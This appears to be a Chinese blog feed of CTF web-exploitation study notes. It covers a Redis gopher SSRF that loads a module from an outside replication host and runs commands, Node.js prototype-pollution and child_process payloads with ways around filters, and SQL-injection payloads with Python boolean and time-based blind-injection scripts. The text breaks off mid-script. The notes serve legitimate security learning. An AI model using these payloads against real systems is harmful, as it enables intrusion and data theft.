<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://0.0.0.0/hint.php</span><br></pre></td></tr></table></figure>

<p>得到redis的密码root</p>
<p>然后利用gopher协议结合redis主从复制rce漏洞进行攻击</p>
<p>构造如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=gopher://0.0.0.0:6397/_auth%2520root%250Aconfig%2520set%2520dir%2520/tmp%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%25208.138.103.251%252015000%250Aquit</span><br><span class="line">#实际执行命令如下</span><br><span class="line">auth root</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 8.138.103.251 15000</span><br><span class="line">quit #让运行结束,显示运行结果</span><br><span class="line">#设置从属并开始同步(此处记得要双重url编码)</span><br><span class="line">module load ./exp.so</span><br><span class="line">system.exec &quot;cat /flag&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250529014434949.png" alt="image-20250529014434949"></p>
<p>但是不知道为啥就关容器时候ping通过一次之后怎么试都不通了….</p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Nodejs原型链污染&amp;命令执行</title>
    <url>/2025/06/22/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="原型链与原型链污染"><a href="#原型链与原型链污染" class="headerlink" title="原型链与原型链污染"></a>原型链与原型链污染</h1><p><a href="https://www.anquanke.com/post/id/242645">https://www.anquanke.com/post/id/242645</a></p>
<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>当我们在调用对象某属性时：</p>
<ol>
<li>对象(obj)中寻找这一属性</li>
<li>如果找不到，则在obj.__ proto __(xx.prototype)中寻找属性</li>
<li>如果仍然找不到，则继续在obj.__ proto __ . __ proto __(xx.prototype)中寻找这一属性</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">\\访问原型对象方法</span><br><span class="line">objectname[[prototype]]</span><br><span class="line">objectname.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>
<p>注：__ proto __属性被用于继承原型对象xx.prototype上定义的属性方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原型链示例：</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承于 Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链: o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链: a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链: f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>

<h2 id="原型链污染："><a href="#原型链污染：" class="headerlink" title="原型链污染："></a>原型链污染：</h2><p>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</p>
<ul>
<li>例：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">object1 = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>,<span class="string">&quot;2&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.<span class="property">__proto__</span>.<span class="property">foo</span>=<span class="string">&quot;nihao&quot;</span>;<span class="comment">//污染了原型</span></span><br><span class="line">object2 = &#123;<span class="string">&quot;1&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object2.<span class="property">foo</span>);<span class="comment">//输出nihao</span></span><br></pre></td></tr></table></figure>
<h2 id="Merge-类操作导致原型链污染"><a href="#Merge-类操作导致原型链污染" class="headerlink" title="Merge 类操作导致原型链污染"></a>Merge 类操作导致原型链污染</h2><p>对source进行<em><strong>json传递</strong></em>，来污染原型链，使得其他地方未被定义的属性向上查找<br>大致代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”</span></span><br><span class="line"><span class="comment">//没有JSON.parse时，在进行键值赋值之前就会把proto解析掉，让其指向其构造函数的prototype指向的对象</span></span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span>, object1.<span class="property">b</span>)</span><br><span class="line"><span class="comment">//会执行a[&quot;__proto__&quot;] = &#123;&quot;b&quot;: 2&#125;&#125;</span></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
<p>相关ctf例题：</p>
<ul>
<li><p>[GYCTF2020]Ez_Express(污染未定义属性，通过渲染输出)</p>
<p>{“lua”:”123”,”<strong>proto</strong>“:{“outputFunctionName”:”t&#x3D;1;return global.process.mainModule.constructor._load(‘child_process’).execSync(‘cat &#x2F;flag’).toString()&#x2F;&#x2F;“},”Submit”:””}</p>
</li>
</ul>
<blockquote>
<p>特殊字符绕过<br>toUpperCase()<br>其中混入了两个奇特的字符”ı”、”ſ”。<br>​ 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() &#x3D;&#x3D; ‘I’，”ſ”.toUpperCase() &#x3D;&#x3D; ‘S’。通过这个小特性可以绕过一些限制。<br>toLowerCase()<br>​ 这个”K”的“小写”字符是k，也就是”K”.toLowerCase() &#x3D;&#x3D; ‘k’.</p>
</blockquote>
<ul>
<li><p>Nullcon HackIM（污染属性，绕过登录验证）</p>
<p>{“<strong>proto</strong>“: {“admin”: 1}}</p>
</li>
</ul>
<h2 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h2><p>__proto__被过滤：</p>
<ol>
<li>空格绕过</li>
<li>{“constructor”:{“prototype”:{“userrole”:”Superadmin”}}}</li>
</ol>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行的方式"><a href="#命令执行的方式" class="headerlink" title="命令执行的方式"></a>命令执行的方式</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//执行系统命令(node.js中的child_process.exec调用的是bash.sh可以执行系统命令)</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawn</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;\flag&#x27;</span>]);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;\flag&#x27;</span>]);</span><br><span class="line"><span class="comment">//回显常用.stdout.toString()/.toString()</span></span><br></pre></td></tr></table></figure>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
<li><p>十六进制绕过 (十六进制等价ascii字符，但是可以绕过正则)</p>
<blockquote>
<p>require(“child_process”)<a href="%22ls%22">“exe\x63Sync”</a></p>
</blockquote>
</li>
<li><p>unicode编码绕过 ”反斜杠+u+码点” </p>
<blockquote>
<p>require(“child_process”)<a href="" title="curl 127.0.0.1:1234">“exe\u0063Sync”</a></p>
</blockquote>
</li>
<li><p>base64编码绕过</p>
<blockquote>
<p>eval(Buffer.from(“cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp”,’base64’).toString(‘ascii’))</p>
</blockquote>
</li>
</ul>
<h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><ul>
<li><p>‘+’号拼接</p>
<blockquote>
<p>require(“child_process”)<a href="%22ls%22">“exec”+”Sync”</a></p>
</blockquote>
</li>
<li><p>concat拼接</p>
<blockquote>
<p>require(“child_process”)<a href="%22ls%22">“exe”.concat(“Sync”)</a></p>
</blockquote>
</li>
</ul>
<h3 id="模板字符串-nodejs中-等价于引号"><a href="#模板字符串-nodejs中-等价于引号" class="headerlink" title="模板字符串(nodejs中&#96;&#96;等价于引号)"></a>模板字符串(nodejs中&#96;&#96;等价于引号)</h3><blockquote>
<p><code>$&#123;</code>${<code>return proc</code>}ess<code>&#125;</code> &#x3D; return process</p>
</blockquote>
<h3 id="Obejct-keys"><a href="#Obejct-keys" class="headerlink" title="Obejct.keys"></a>Obejct.keys</h3><blockquote>
<p>global.process.mainModule.require(‘child_process’).execSync(‘whoami’)</p>
</blockquote>
<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><blockquote>
<p>Reflect.ownKeys(global)  &#x2F;&#x2F;返回所有函数<br>global[Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’))] &#x2F;&#x2F;找到eval<br>includes(‘eva’)&#x2F;startswith(‘eva’)均可</p>
</blockquote>
<h3 id="过滤中括号的情况"><a href="#过滤中括号的情况" class="headerlink" title="过滤中括号的情况"></a>过滤中括号的情况</h3><blockquote>
<p>Reflect.get(global, Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eva’)))<br>Reflect.get(target,name) &#x3D; target[name]</p>
</blockquote>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul>
<li>特性：</li>
</ul>
<ol>
<li>计算字符串</li>
<li>执行js代码<br>比如：eval()，ssti，渲染</li>
</ol>
<ul>
<li>漏洞利用</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/eval&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="built_in">eval</span>(req.<span class="property">query</span>.<span class="property">q</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">q</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>构造如下payload：</p>
<blockquote>
<p>&#x2F;eval?q&#x3D;require(‘child_process’).exec(‘cat &#x2F;flag’)<br>&#x2F;eval?q&#x3D;global.process.mainModule.constructor._load(‘child_process’).execSync(‘cat &#x2F;flag’).toString()<br>&#x2F;eval?q&#x3D;global.process.mainModule.require(‘child_process’).execSync(‘whoami’)</p>
</blockquote>
<h1 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h1><p>app.js末尾加上监听代码，再运行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server is running on http://localhost:3000&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>sql小总结</title>
    <url>/2025/06/22/sql/</url>
    <content><![CDATA[<h1 id="基础知识点："><a href="#基础知识点：" class="headerlink" title="基础知识点："></a>基础知识点：</h1><ol>
<li>注释符：# ,  &#x2F;**&#x2F; , –+</li>
<li>重要的表:<table>
<thead>
<tr>
<th align="center">表名</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">information_schema.schemata</td>
<td align="center">存储了myspl中所有数据库名</td>
</tr>
<tr>
<td align="center">information_schema.tables</td>
<td align="center">存储了myspl中所有表名</td>
</tr>
<tr>
<td align="center">information_schema.columns</td>
<td align="center">存储了myspl中所有列名</td>
</tr>
</tbody></table>
</li>
<li>常用函数:<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">version()</td>
<td align="center">查询数据库的版本</td>
</tr>
<tr>
<td align="center">user()</td>
<td align="center">查询数据库的使用者</td>
</tr>
<tr>
<td align="center">database()</td>
<td align="center">数据库</td>
</tr>
<tr>
<td align="center">system_user()</td>
<td align="center">系统用户名</td>
</tr>
<tr>
<td align="center">session_user()</td>
<td align="center">连接数据库的用户名</td>
</tr>
<tr>
<td align="center">current_user()</td>
<td align="center">当前用户名</td>
</tr>
<tr>
<td align="center">load_file()</td>
<td align="center">读取本地文件</td>
</tr>
<tr>
<td align="center">@@datadir</td>
<td align="center">读取数据库路径</td>
</tr>
<tr>
<td align="center">@@basedir</td>
<td align="center">mysql安装路径</td>
</tr>
<tr>
<td align="center">@@version_complie_os</td>
<td align="center">查看操作系统</td>
</tr>
<tr>
<td align="center">ascii(str)</td>
<td align="center">返回给定字符的ascii值。如果str是空字符串，返回0如果str是NULL，返回NULL。如 ascii(“a”)&#x3D;97</td>
</tr>
<tr>
<td align="center">length(str)</td>
<td align="center">返回给定字符串的长度，如 length(“string”)&#x3D;6</td>
</tr>
<tr>
<td align="center">substr(string,start,length)</td>
<td align="center">对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)&#x3D;”in”</td>
</tr>
<tr>
<td align="center">substr()、stbstring()、mid()</td>
<td align="center">三个函数的用法、功能均一致</td>
</tr>
<tr>
<td align="center">concat(username)</td>
<td align="center">将查询到的username连在一起，默认用逗号分隔</td>
</tr>
<tr>
<td align="center">concat(str1,’*’,str2)</td>
<td align="center">将字符串str1和str2的数据查询到一起，中间用*连接</td>
</tr>
<tr>
<td align="center">group_concat(username)</td>
<td align="center">将username所有数据查询在一起，用逗号连接</td>
</tr>
<tr>
<td align="center">limit 0,1</td>
<td align="center">查询第一页</td>
</tr>
</tbody></table>
</li>
</ol>
<p>4.常用语句:<br>SELECT column1, column2, …(*指所有行)<br>FROM table_name<br>[WHERE condition]<br>(条件运算符,逻辑运算符,以及通配符(与like配合使用,%代替零个或多个字符,_代替一个字符))<br>[ORDER BY column_name [ASC | DESC]]<br>[LIMIT number];</p>
<h1 id="判断sql注入"><a href="#判断sql注入" class="headerlink" title="判断sql注入"></a>判断sql注入</h1><ul>
<li>产生于与数据库发生交互的地方(登陆页面,涉及获取http头的功能点以及订单处理……)</li>
<li>单引号,双引号,单括号,双括号等测试报错</li>
<li>and 1&#x3D;1 &#x2F;and 1&#x3D;2 ,看页面显示(不报错为字符型，报错为数字型)</li>
<li>时间盲注测试</li>
<li>1’ or 1&#x3D;1#</li>
<li>有时可以直接尝试读取flag库和表</li>
<li>判断数据库类型</li>
<li>在常见手段没用的时候考虑过滤（尤其要测试对关键词的双写）</li>
</ul>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><ol>
<li><p>条件:</p>
<ul>
<li>两个表的列数相同，并且相应的列具有相似的数据类型</li>
<li>查询结果回显</li>
<li>存在注入漏洞</li>
</ul>
</li>
<li><p>常用函数:</p>
</li>
</ol>
<blockquote>
<p>union select</p>
<ol start="3">
<li>基本操作流程:</li>
</ol>
</blockquote>
<ul>
<li><p>id&#x3D;1 order by 2  &#x2F;&#x2F;根据报错判断列数</p>
</li>
<li><p>id&#x3D; -1 union select group_concat(table_name),1,2,3 from information_schema.tables where table_schema &#x3D;&#x2F;like database()  &#x2F;&#x2F;爆表名</p>
</li>
<li><p>id &#x3D; -1  union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘xx’   &#x2F;&#x2F;爆列名</p>
</li>
<li><p>id &#x3D; -1  union select concat(co)  from table  &#x2F;&#x2F;结果</p>
</li>
</ul>
<p>SQlite中的联合注入</p>
<ul>
<li><p>union select 1,2,3,sqlite_version(),(select sql from sqlite_master limit 0,1)— &#x2F;&#x2F;查看表</p>
</li>
<li><p>union select 1,2,3,sqlite_version(),(select group_concat(flag) from flag)– &#x2F;&#x2F;查数据</p>
</li>
</ul>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><ol>
<li>条件:<ul>
<li>报错正常回显</li>
</ul>
</li>
<li>常用函数:<blockquote>
<ol>
<li>updatexml（XML_document，XPath_string，new_value）<ul>
<li>作用:改变文档中符合条件的节点的值</li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ol>
<blockquote>
<pre><code>  - 第一个参数：(string)XML文档对象的名称; 第二个参数：(Xpath格式的字符串)代表路径;第三个参数：(string)替换查找到的符合条件的数据
  -当XPath_string出错就会报错,并会显示第二参数的内容
</code></pre>
<ol start="2">
<li>extractvalue（XML_document，xpath_string）<ul>
<li>作用:返回目标XML中包含所查询值的字符串</li>
</ul>
</li>
</ol>
</blockquote>
<ol start="3">
<li><p>基本操作流程:</p>
<ul>
<li><p>id &#x3D; 1 and updatexml(1,0x7e,2)</p>
</li>
<li><p>id &#x3D; 1 and updatexml(1,concat(0x7e,substr((select flag from flag),1,31)),3)  &#x2F;&#x2F;报错内容不超过32个字符,用substr复制解决(从1复制到31)</p>
</li>
<li><p>id &#x3D; 1 and updatexml(1,concat(‘~’,concat(0x7e,(select password from users limit 0,1)),3)<br>&#x2F;&#x2F;用limit解决(从0行开始返回1行)</p>
</li>
</ul>
</li>
</ol>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><ol>
<li><p>条件:</p>
<ul>
<li>根据返回的true&#x2F;flase判断输入信息正确与否</li>
</ul>
</li>
<li><p>常用函数:</p>
<blockquote>
<p>ascii()<br>substr()<br>length()<br>exists()<br>concat()</p>
</blockquote>
</li>
<li><p>基本操作流程:</p>
<ul>
<li>id&#x3D;1 and exists(select * from information_schema.tables<mysql>&#x2F;select<em>from msysobjects<access>&#x2F;select</em>from sysobjects<sqlserver>)  &#x2F;&#x2F;猜测数据库类型</li>
<li>id&#x3D;1 and length(database()) &gt; 5 &#x2F;&#x2F;猜测数据库名</li>
<li>id&#x3D;1 and ascii(substrate(database(),1,1) &#x3D;&#x3D; 1) &#x2F;&#x2F;逐字符猜测</li>
</ul>
</li>
<li><p>脚本:</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge-25ea32adc843431f.sandbox.ctfhub.com:10800/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果变量</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### **1. 用二分法查找 flag 长度**</span></span><br><span class="line">low, high = <span class="number">1</span>, <span class="number">200</span>  <span class="comment"># 长度范围</span></span><br><span class="line"><span class="keyword">while</span> low &lt; high:</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    payload = <span class="string">f&#x27;1 and length((Select flag from flag)) &lt;= <span class="subst">&#123;mid&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    res = requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;query_success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        high = mid  <span class="comment"># 长度 &lt;= mid，继续向左搜索</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        low = mid + <span class="number">1</span>  <span class="comment"># 长度 &gt; mid，向右搜索</span></span><br><span class="line"></span><br><span class="line">flag_length = low</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Flag length found: <span class="subst">&#123;flag_length&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### **2. 用二分法查找 flag 每个字符**</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_length + <span class="number">1</span>):</span><br><span class="line">    low, high = <span class="number">32</span>, <span class="number">126</span>  <span class="comment"># ASCII 可打印字符范围</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting character at position <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&#x27;1 and ord(mid((Select flag from flag), <span class="subst">&#123;i&#125;</span>, 1)) &lt;= <span class="subst">&#123;mid&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;query_success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            high = mid  <span class="comment"># 说明字符 &lt;= mid，缩小范围</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span>  <span class="comment"># 说明字符 &gt; mid，向右搜索</span></span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Found character: <span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Current Flag: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Final Flag: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ol>
<li><p>条件:</p>
<ul>
<li>无回显</li>
<li>加入sleep(5),返回速度慢5s</li>
</ul>
</li>
<li><p>常用函数:</p>
<blockquote>
<p>sleep()<br>1 and if(1&#x3D;2, 1, sleep(2)) &#x2F;&#x2F;如果第一个参数为false,返回sleep(2),如果第一个参数为true,返回1</p>
</blockquote>
</li>
<li><p>脚本</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-8cf69dd2f27977b3.sandbox.ctfhub.com:10800/&#x27;</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload = <span class="string">f&quot;1 and if((length((select flag from flag)))=<span class="subst">&#123;length&#125;</span>, sleep(2), 1)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 这里 timeout=1 用来判断是否 sleep(2) 生效</span></span><br><span class="line">        requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;, timeout=<span class="number">1</span>).text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="comment"># 发生超时，说明 sleep(2) 生效，长度正确</span></span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span>  <span class="comment"># 没有超时，继续增加长度</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Flag length found: <span class="subst">&#123;length&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">    low, high = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting character at position <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;1 and if((ord(mid((select flag from flag), <span class="subst">&#123;i&#125;</span>, 1))&lt;=<span class="subst">&#123;mid&#125;</span>), sleep(2), 1)&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;, timeout=<span class="number">1</span>).text</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error:&quot;</span>, e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Found character: <span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Current Flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>SQlite中的时间盲注(用case-when类似于if-else，randomblob类似于sleep),脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:46017/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(username))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line"> <span class="comment"># payload = 